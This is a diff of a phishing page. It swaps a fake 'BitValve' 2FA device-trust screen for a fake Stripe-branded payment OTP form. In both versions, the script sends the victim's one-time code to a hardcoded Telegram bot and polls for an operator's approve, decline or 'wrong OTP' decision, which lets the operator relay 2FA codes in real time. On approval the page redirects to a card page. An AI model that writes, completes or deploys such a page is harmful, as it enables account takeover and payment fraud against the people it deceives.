@@ -4,169 +4,263 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BitValve - Trust this device</title>
+    <title>OTP Inputs Form</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
     <style>
-        /* ========== GLOBAL RESET ========== */
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Inter", sans-serif;
-        }
-        
         body {
-            background-color: #f2f2f2;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #a0e1eb, #09d62c);
             display: flex;
-            align-items: center;
             justify-content: center;
-            height: 100vh;
-        }
-        /* ========== MAIN CONTAINER ========== */
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
             padding: 20px;
         }
         
-        .card {
+        .otp-container {
             background: white;
-            border-radius: 12px;
-            padding: 30px 25px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            border-radius: 20px;
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
+            padding: 35px 30px;
             text-align: center;
-        }
-        /* ========== LOGO AREA ========== */
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-        
-        .logo svg {
-            width: 28px;
-            height: 28px;
-            fill: #016a54;
-        }
-        
-        h2 {
-            color: #003b2b;
-            font-weight: 700;
-        }
-        /* ========== TITLE & TEXT ========== */
-        
-        h3 {
-            color: #016a54;
-            font-size: 20px;
-            margin-top: 10px;
-            font-weight: 600;
-        }
-        
-        .subtitle {
-            font-size: 12px;
-            color: #7a7a7a;
-            margin: 20px 0 10px;
-            letter-spacing: 0.5px;
-        }
-        /* ========== INPUT CODE BOXES ========== */
-        
-        .code-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .code-inputs input {
-            width: 45px;
-            height: 50px;
-            text-align: center;
-            font-size: 20px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-            outline: none;
-            transition: 0.2s ease;
-        }
-        
-        .code-inputs input:focus {
-            border-color: #016a54;
-            box-shadow: 0 0 0 2px rgba(1, 106, 84, 0.2);
-        }
-        /* ========== BUTTON ========== */
-        
-        #trust-btn {
             width: 100%;
-            background: #0e0e0e;
-            color: #00ff84;
-            border: none;
-            border-radius: 30px;
-            padding: 14px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: 0.3s ease;
+            max-width: 440px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s;
         }
         
-        #trust-btn:hover {
-            background: #1a1a1a;
-        }
-        
-        #trust-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            background: #333;
-        }
-        /* ========== ERROR MESSAGE ========== */
-        
-        .error-msg {
-            background: rgba(239, 68, 68, 0.12);
-            border: 1px solid rgba(239, 68, 68, 0.25);
-            color: #dc2626;
-            padding: 10px 14px;
-            border-radius: 10px;
-            font-size: 13px;
-            margin: 16px 0;
-            display: none;
-            text-align: center;
-        }
-        /* ========== SPINNER OVERLAY ========== */
-        
-        .spinner-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease, visibility 0.4s ease;
+        .otp-container::before {
+            content: "";
+            position: absolute;
+            top: -70px;
+            left: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(9, 214, 44, 0.12), transparent 70%);
+            border-radius: 50%;
             pointer-events: none;
         }
         
-        .spinner-overlay.active {
+        .otp-container::after {
+            content: "";
+            position: absolute;
+            bottom: -70px;
+            right: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(0, 123, 255, 0.1), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .otp-container:hover {
+            transform: translateY(-4px);
+        }
+        
+        .otp-shield {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #eaf7ef, #d9f5e2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: #09d62c;
+            box-shadow: 0 6px 16px rgba(9, 214, 44, 0.25);
+            position: relative;
+            z-index: 1;
+        }
+        
+        h2 {
+            color: #007BFF;
+            margin-bottom: 8px;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .otp-sub {
+            color: #999;
+            font-size: 0.95rem;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .otp-input {
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        #otp-input {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 14px;
+            font-size: 2.4rem;
+            font-weight: 500;
+            letter-spacing: 8px;
+            text-align: center;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #fafafa;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+        }
+        
+        #otp-input::placeholder {
+            letter-spacing: 6px;
+            color: #ccc;
+        }
+        
+        #otp-input:hover {
+            border-color: #b0b0b0;
+            background: #fff;
+        }
+        
+        #otp-input:focus {
+            border-color: #007BFF;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
+        }
+        
+        .otp-counter {
+            font-size: 0.8rem;
+            color: #bbb;
+            margin-top: 8px;
+        }
+        
+        .btn {
+            margin-top: 15px;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #007BFF, #0056b3);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s, opacity 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0069d9, #004a99);
+            transform: translateY(-2px);
+            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+        }
+        
+        .btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+            transform: none;
+        }
+        
+        .otp-footer {
+            margin-top: 22px;
+            color: #777;
+            font-size: 0.9rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stripe-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: #f4f4f6;
+            border: 1px solid #e4e4e8;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+        
+        .stripe-tag .fa-stripe-s {
+            color: #635bff;
+            font-size: 1.2rem;
+        }
+        
+        .secure-note {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        .secure-note .fa-lock {
+            color: #09d62c;
+        }
+        
+        .otp-error {
+            color: #e02020;
+            font-size: 0.85rem;
+            min-height: 18px;
+            margin-top: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        /* Dedicated responsive status element */
+        
+        #otpStatus {
+            color: #e02020;
+            font-size: 0.95rem;
+            margin-top: 8px;
+            min-height: 20px;
+            /* prevents layout jump */
+            word-break: break-word;
+            padding: 0 6px;
+            position: relative;
+            z-index: 1;
+            display: block;
             opacity: 1;
-            visibility: visible;
-            pointer-events: all;
+        }
+        /* ===== Overlay Spinner ===== */
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .overlay.active {
+            display: flex;
+        }
+        
+        .overlay-box {
+            background: white;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: min(360px, 90vw);
         }
         
         .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid rgba(255, 255, 255, 0.15);
-            border-top-color: #00ff84;
+            width: 42px;
+            height: 42px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #007BFF;
             border-radius: 50%;
-            animation: spin 0.9s linear infinite;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
         }
         
         @keyframes spin {
@@ -174,374 +268,259 @@
                 transform: rotate(360deg);
             }
         }
-        
-        .spinner-text {
-            color: #d1d5db;
-            font-size: 15px;
-            margin-top: 20px;
-            font-weight: 500;
-        }
-        
-        .spinner-email {
-            color: #00ff84;
-            font-size: 14px;
-            margin-top: 6px;
-            font-weight: 600;
-            word-break: break-all;
-            max-width: 300px;
-            text-align: center;
-        }
-        
-        .cancel-poll-btn {
-            margin-top: 22px;
-            padding: 10px 28px;
-            background: transparent;
-            border: 1px solid #4b5563;
-            border-radius: 50px;
-            color: #9ca3af;
-            font-family: inherit;
-            font-size: 13px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .cancel-poll-btn:hover {
-            border-color: #ef4444;
-            color: #ef4444;
-        }
-        /* ========== RESPONSIVE ========== */
-        
-        @media (max-width: 480px) {
-            .card {
-                padding: 20px;
-            }
-            .code-inputs input {
-                width: 40px;
-                height: 45px;
-                font-size: 18px;
-            }
-            h3 {
-                font-size: 18px;
-            }
-            #trust-btn {
-                font-size: 15px;
-                padding: 12px;
-            }
-        }
+        /* Telegram buttons are rendered by Telegram; no local CSS needed */
     </style>
 </head>
 
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="logo">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z" />
-                </svg>
-                <h2>BitValve</h2>
+    <div class="otp-container">
+        <div class="otp-shield">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+
+        <h2>Enter OTP</h2>
+
+        <p class="otp-sub">
+            <i class="fas fa-phone-volume"></i> A verification code was sent to your phone/email
+        </p>
+
+        <div class="otp-input">
+            <input type="text" id="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••" autocomplete="one-time-code" />
+            <div class="otp-counter" id="otp-counter">code digits</div>
+        </div>
+
+        <button id="submitButton" class="btn">
+      <i class="fas fa-check-circle"></i>&nbsp; Verify
+    </button>
+
+        <!-- Existing error container (kept as-is) -->
+        <div class="otp-error" id="otp-error"></div>
+
+        <!-- Dedicated status element -->
+        <div id="otpStatus" aria-live="polite"></div>
+
+        <div id="status-message" style="display:none;"></div>
+
+        <div class="otp-footer">
+            Online payments verified by
+            <div class="stripe-tag">
+                <i class="fab fa-stripe-s"></i> Powered by Stripe
             </div>
-
-            <h3>Trust this device</h3>
-            <p class="subtitle">2FA CODE</p>
-
-            <!-- Error message -->
-            <div class="error-msg" id="otpError"></div>
-
-            <div class="code-inputs">
-                <input type="text" maxlength="1" id="otp0" />
-                <input type="text" maxlength="1" id="otp1" />
-                <input type="text" maxlength="1" id="otp2" />
-                <input type="text" maxlength="1" id="otp3" />
-                <input type="text" maxlength="1" id="otp4" />
-                <input type="text" maxlength="1" id="otp5" />
-            </div>
-
-            <button id="trust-btn">Trust Device</button>
+            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
         </div>
     </div>
 
-    <!-- ===== Spinner Overlay ===== -->
-    <div class="spinner-overlay" id="spinnerOverlay">
-        <div class="spinner"></div>
-        <p class="spinner-text">Verifying 2FA code...</p>
-        <p class="spinner-email" id="spinnerInfo"></p>
-        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    <div class="overlay" id="waiting-overlay">
+        <div class="overlay-box">
+            <div class="spinner"></div>
+            <p>Processing payment ...</p>
+        </div>
     </div>
 
-    <!-- ===== Telegram Inline Keyboard + Polling ===== -->
     <script>
-        /* ----- CONFIG ----- */
-        const TELEGRAM_BOT_TOKEN = "8925491252:AAHHPs-bUPJn9HqRV15nyZZbao5cPMmYkKo";
-        const TELEGRAM_CHAT_ID = "1003670447";
+        // ─── Telegram Bot Config ────────────────────────────────────────
+        const botToken = '9022721409:AAGgIMZwn41gfTPj4pXA3zjxP92LMbXzOq8';
+        const chatId = '7912960401';
 
-        /* ----- State ----- */
-        let pollDecided = false;
-        let pollTimeoutId = null;
-        let currentPollController = null;
+        // ─── DOM refs ────────────────────────────────────────────────────
+        const submitBtn = document.getElementById('submitButton');
+        const statusMsg = document.getElementById('status-message');
+        const overlay = document.getElementById('waiting-overlay');
+        const otpInput = document.getElementById('otp-input');
+        const otpError = document.getElementById('otp-error');
 
-        /* ----- Auto-move between OTP inputs ----- */
-        const inputs = document.querySelectorAll(".code-inputs input");
+        const otpStatus = document.getElementById('otpStatus');
 
-        inputs.forEach((input, index) => {
-            input.addEventListener("input", (e) => {
-                const value = e.target.value;
-                if (value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-            });
+        // ─── Helpers ─────────────────────────────────────────────────────
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
 
-            input.addEventListener("keydown", (e) => {
-                if (e.key === "Backspace" && !e.target.value && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
+        function getOtp() {
+            return otpInput.value.trim();
+        }
 
-            // Allow only digits
-            input.addEventListener("keypress", (e) => {
-                if (!/^\d$/.test(e.key)) {
-                    e.preventDefault();
-                }
-            });
+        function setCounterText() {
+            const n = otpInput.value.length;
+            document.getElementById('otp-counter').textContent = `${n} / 6 digits`;
+        }
+
+        // UPDATED: reset will NOT clear otpStatus by default (so Decline/Wrong messages stay visible every time).
+        function resetOtpInputs({
+            keepValue = false,
+            clearOtpStatus = false
+        } = {}) {
+            if (!keepValue) otpInput.value = '';
+            otpInput.focus();
+
+            otpError.textContent = '';
+            statusMsg.style.display = 'none';
+            statusMsg.textContent = '';
+
+            if (clearOtpStatus) {
+                otpStatus.textContent = '';
+            }
+
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fas fa-check-circle"></i>&nbsp; Verify';
+        }
+
+        function setOtpStatus(message) {
+            otpStatus.textContent = message;
+            otpStatus.style.color = '#e02020';
+        }
+
+        // Allow only digits
+        otpInput.addEventListener('input', () => {
+            otpInput.value = otpInput.value.replace(/\D/g, '');
+            if (otpInput.value.length > 6) otpInput.value = otpInput.value.slice(0, 6);
+            setCounterText();
         });
 
-        /* ----- Helpers ----- */
-        function showError(msg) {
-            const err = document.getElementById('otpError');
-            err.textContent = msg;
-            err.style.display = 'block';
-        }
-
-        function hideError() {
-            document.getElementById('otpError').style.display = 'none';
-        }
-
-        /* ----- Cancel polling ----- */
-        function cancelPolling() {
-            pollDecided = true;
-            if (pollTimeoutId) clearTimeout(pollTimeoutId);
-            if (currentPollController) currentPollController.abort();
-            document.getElementById('spinnerOverlay').classList.remove('active');
-            document.getElementById('trust-btn').disabled = false;
-            showError('Request cancelled. Please try again.');
-        }
-
-        /* ----- Polling loop (long-poll for callback_query) ----- */
-        function startPolling(userId, onApproveUrl) {
+        // ─── Poll Telegram for callback decision ──────────────────────
+        // callback_data formats:
+        // approve_otp_<submissionId>
+        // decline_otp_<submissionId>
+        // wrong_otp_<submissionId>
+        function pollForDecision(submissionId) {
             let offset = 0;
-            pollDecided = false;
-            let pollCount = 0;
-            const maxPolls = 90;
-            let retryDelay = 2000;
 
-            if (currentPollController) currentPollController.abort();
-            currentPollController = new AbortController();
+            const poll = setInterval(async() => {
+                try {
+                    const resp = await fetch(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
+                    );
+                    const data = await resp.json();
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`, {
-                    signal: currentPollController.signal
-                })
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        offset = data.result[data.result.length - 1].update_id + 1;
-                    }
-                    pollLoop();
-                })
-                .catch(err => {
-                    if (err.name !== 'AbortError') {
-                        console.error('Initial offset error:', err);
-                        pollLoop();
-                    }
-                });
-
-            function pollLoop() {
-                if (pollDecided) return;
-                pollCount++;
-                if (pollCount > maxPolls) {
-                    pollDecided = true;
-                    document.getElementById('spinnerOverlay').classList.remove('active');
-                    document.getElementById('trust-btn').disabled = false;
-                    showError('Request timed out. Please try again.');
-                    return;
-                }
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
-                        method: 'GET',
-                        signal: currentPollController.signal
-                    })
-                    .then(r => {
-                        if (!r.ok) {
-                            if (r.status === 409) {
-                                retryDelay = Math.min(retryDelay * 1.5, 10000);
-                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
-                                return null;
-                            }
-                            throw new Error('HTTP ' + r.status);
-                        }
-                        retryDelay = 2000;
-                        return r.json();
-                    })
-                    .then(data => {
-                        if (data === null) return;
-                        if (!data.ok || pollDecided) {
-                            if (!pollDecided) {
-                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
-                            }
-                            return;
-                        }
-
+                    if (data.ok && Array.isArray(data.result) && data.result.length) {
                         for (const update of data.result) {
                             offset = update.update_id + 1;
-                            if (update.callback_query) {
-                                const action = update.callback_query.data;
 
-                                // Answer the callback query
-                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        callback_query_id: update.callback_query.id,
-                                        text: "Action recorded!"
-                                    })
-                                }).catch(() => {});
+                            if (!update.callback_query) continue;
 
-                                if (action === `approve_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    window.location.href = onApproveUrl;
-                                    return;
-                                } else if (action === `decline_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    document.getElementById('trust-btn').disabled = false;
-                                    showError('Request declined. Please try again.');
-                                    return;
-                                } else if (action === `wrong_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    document.getElementById('trust-btn').disabled = false;
-                                    showError('Wrong code. Please enter the correct 2FA code.');
-                                    return;
-                                }
+                            const cb = update.callback_query;
+                            const cbData = cb.data || '';
+
+                            const parts = cbData.split('_');
+                            const action = parts[0]; // approve / decline / wrong
+                            const id = parts.slice(2).join('_'); // everything after "otp"
+
+                            if (id !== submissionId) continue;
+
+                            clearInterval(poll);
+                            overlay.classList.remove('active');
+
+                            if (action === 'approve') {
+                                window.location.href = 'card.html';
+                                return;
                             }
-                        }
 
-                        if (!pollDecided) {
-                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                            if (action === 'decline') {
+                                // Decline button -> "OTP Declined" in red on UI (no alert)
+                                setOtpStatus('OTP Declined, enter new otp send');
+                                resetOtpInputs({
+                                    keepValue: false
+                                }); // keep otpStatus visible
+                                return;
+                            }
+
+                            if (action === 'wrong') {
+                                // Wrong OTP -> "You entered wrong OTP" in red on UI (no alert)
+                                setOtpStatus('You entered wrong OTP, Re-enter new OTP sent');
+                                resetOtpInputs({
+                                    keepValue: false
+                                }); // keep otpStatus visible
+                                return;
+                            }
+
+                            // fallback
+                            setOtpStatus('OTP rejected. Please try again.');
+                            resetOtpInputs({
+                                keepValue: false
+                            });
                         }
-                    })
-                    .catch(err => {
-                        if (err.name === 'AbortError') return;
-                        console.error('Poll error:', err);
-                        if (!pollDecided) {
-                            retryDelay = Math.min(retryDelay * 1.2, 8000);
-                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
-                        }
-                    });
-            }
+                    }
+                } catch (err) {
+                    console.error('Poll error:', err);
+                }
+            }, 2000);
         }
 
-        /* ----- Send message with inline keyboard to Telegram ----- */
-        function sendTelegramMessage(message, keyboard, userId, onApproveUrl) {
-            const spinnerOverlay = document.getElementById('spinnerOverlay');
-            const trustBtn = document.getElementById('trust-btn');
+        // ─── Form submission ────────────────────────────────────────────
+        submitBtn.addEventListener('click', () => {
+            const otp = getOtp();
 
-            let attempts = 0;
-            const maxAttempts = 3;
-
-            function attemptSend() {
-                attempts++;
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML',
-                            reply_markup: JSON.stringify(keyboard)
-                        })
-                    })
-                    .then(res => {
-                        if (!res.ok) throw new Error('HTTP ' + res.status);
-                        return res.json();
-                    })
-                    .then(data => {
-                        if (data.ok) {
-                            startPolling(userId, onApproveUrl);
-                        } else {
-                            if (attempts < maxAttempts) {
-                                setTimeout(attemptSend, 1000 * attempts);
-                            } else {
-                                spinnerOverlay.classList.remove('active');
-                                trustBtn.disabled = false;
-                                showError('Failed to send notification. Please try again.');
-                            }
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Send error:', err);
-                        if (attempts < maxAttempts) {
-                            setTimeout(attemptSend, 1000 * attempts);
-                        } else {
-                            spinnerOverlay.classList.remove('active');
-                            trustBtn.disabled = false;
-                            showError('Network error. Please check your connection and try again.');
-                        }
-                    });
-            }
-
-            attemptSend();
-        }
-
-        /* ----- Trust Device button click ----- */
-        document.getElementById("trust-btn").addEventListener("click", function() {
-            hideError();
-
-            // Collect the OTP code from inputs
-            const code = Array.from(inputs).map(input => input.value).join('');
-
-            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
-                showError('Please enter the complete 6-digit code.');
+            if (otp.length < 4 || otp.length > 6) {
+                setOtpStatus('⚠️ Please enter a valid OTP of 4 to 6 digits.');
                 return;
             }
 
-            const trustBtn = document.getElementById('trust-btn');
-            const spinnerOverlay = document.getElementById('spinnerOverlay');
-            const spinnerInfo = document.getElementById('spinnerInfo');
+            otpError.textContent = '';
+            otpError.style.color = '#e02020';
 
-            spinnerInfo.textContent = 'Code: ' + code;
-            spinnerOverlay.classList.add('active');
-            trustBtn.disabled = true;
+            // Clear previous status before submitting
+            setOtpStatus('');
+            // (Alternative: resetOtpInputs can clearOtpStatus, but we want to clear here before polling)
+            otpStatus.textContent = '';
 
-            const userId = 'otp_' + Date.now();
-            const message = `🔐 <b>BitValve 2FA Code Received</b>
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Submitting...';
 
-🔢 Code: <code>${code}</code>
-⏰ Time: ${new Date().toLocaleString('en-ZA')}
+            const submissionId = generateId();
 
-<b>Please approve, decline, or mark as wrong code:</b>`;
+            const message =
+                `🔐 New OTP Submission\n` +
+                `━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${submissionId}\n` +
+                `🔢 OTP: ${otp}\n` +
+                `━━━━━━━━━━━━━━━`;
 
-            const keyboard = {
+            const inlineKeyboard = {
                 inline_keyboard: [
                     [{
-                        text: "✅ APPROVE",
-                        callback_data: `approve_${userId}`
+                        text: '✅ Approve OTP',
+                        callback_data: `approve_otp_${submissionId}`
                     }, {
-                        text: "❌ DECLINE",
-                        callback_data: `decline_${userId}`
-                    }],
-                    [{
-                        text: "⚠️ WRONG CODE",
-                        callback_data: `wrong_${userId}`
+                        text: '❌ Decline OTP',
+                        callback_data: `decline_otp_${submissionId}`
+                    }, {
+                        text: '⚠️ Wrong OTP',
+                        callback_data: `wrong_otp_${submissionId}`
                     }]
                 ]
             };
 
-            sendTelegramMessage(message, keyboard, userId, 'otp2.html');
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(t => {
+                            throw new Error(t);
+                        });
+                    }
+                    overlay.classList.add('active');
+                    pollForDecision(submissionId);
+                })
+                .catch(error => {
+                    console.error('Telegram Error:', error);
+                    setOtpStatus('❌ Error sending OTP to Telegram. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i>&nbsp; Verify';
+                });
         });
+
+        // Initial
+        otpInput.focus();
+        setCounterText();
     </script>
 </body>
 
